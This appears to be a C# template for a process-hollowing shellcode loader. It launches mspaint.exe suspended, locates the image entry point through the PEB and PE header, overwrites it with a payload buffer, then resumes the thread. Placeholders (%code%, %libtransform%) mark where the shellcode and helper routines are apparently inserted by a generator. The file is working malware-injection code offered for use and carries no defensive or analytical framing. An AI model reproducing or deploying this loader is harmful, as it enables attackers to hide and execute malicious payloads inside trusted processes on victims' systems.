using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.Runtime.InteropServices;

namespace Hollow
{
    class Program
    {
        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine,
IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,
uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
[In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION
lpProcessInformation);

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr ExitStatus;
            public IntPtr PebAddress;
            public IntPtr AffinityMask;
            public IntPtr BasePriority;
            public IntPtr UniquePID;
            public IntPtr InheritedFromUniqueProcessId;
        }

        internal enum PROCESS_INFORMATION_CLASS
        {
            ProcessBasicInformation = 0,
            ProcessDebugPort = 7,
            ProcessWow64Information = 26,
            ProcessImageFileName = 27,
            ProcessBreakOnTermination = 29,
            ProcessSubsystemInformation = 75
        }

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern UInt32 ZwQueryInformationProcess(IntPtr hProcess, PROCESS_INFORMATION_CLASS procInformationClass, 
            ref PROCESS_BASIC_INFORMATION procInformation, UInt32 ProcInfoLen, ref UInt32 retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, 
            [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(
             IntPtr hProcess,
             IntPtr lpBaseAddress,
             byte[] lpBuffer,
             Int32 nSize,
             out IntPtr lpNumberOfBytesWritten
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

%libtransform%

        static void Main(string[] args)
        {

            bool is64 = Environment.Is64BitProcess;
            Console.WriteLine("is64? " + is64);

            STARTUPINFO si = new STARTUPINFO(); 
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            bool res = CreateProcess(null, "C:\\Windows\\System32\\mspaint.exe", IntPtr.Zero, IntPtr.Zero, 
                false, 0x4, IntPtr.Zero, null, ref si, out pi);
            PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            ZwQueryInformationProcess(hProcess, PROCESS_INFORMATION_CLASS.ProcessBasicInformation, ref pbi, 
                (uint)(IntPtr.Size * 6), ref tmp);
            IntPtr ptrToImageBase = (IntPtr)((is64 ? (Int64) pbi.PebAddress: (Int32) pbi.PebAddress) + IntPtr.Size*2);
            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
            IntPtr svchostBase = (IntPtr)(is64 ? BitConverter.ToInt64(addrBuf, 0) : BitConverter.ToInt32(addrBuf, 0));
            
            // read MZ header
            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3c);

	    // fetch rva directly from MZ header block
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)(e_lfanew_offset + 0x28));
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (is64 ? (UInt64)svchostBase : (UInt32)svchostBase));

            // fetch rva with ReadProcessMemory again. seems more reliable? if e_lfanew_offset > (0x200-0x28)
            byte[] rvaBuf = new byte[sizeof(uint)];
            IntPtr addressTemp = (IntPtr)(0x28 + e_lfanew_offset + (is64 ? (UInt64)svchostBase : (UInt32)svchostBase ));
            ReadProcessMemory(hProcess, addressTemp, rvaBuf, rvaBuf.Length, out nRead);
            IntPtr entrypoint = (IntPtr)(BitConverter.ToUInt32(rvaBuf, 0) + (is64 ? (UInt64)svchostBase : (UInt32)svchostBase ));
            Debug.Assert(addressOfEntryPoint == entrypoint);

            IntPtr nWrite;
            %code%

            WriteProcessMemory(hProcess, entrypoint, buf, buf.Length, out nWrite);

            ResumeThread(pi.hThread);
            WaitForSingleObject(pi.hThread, 0xFFFFFFFF);
        }
    }
}
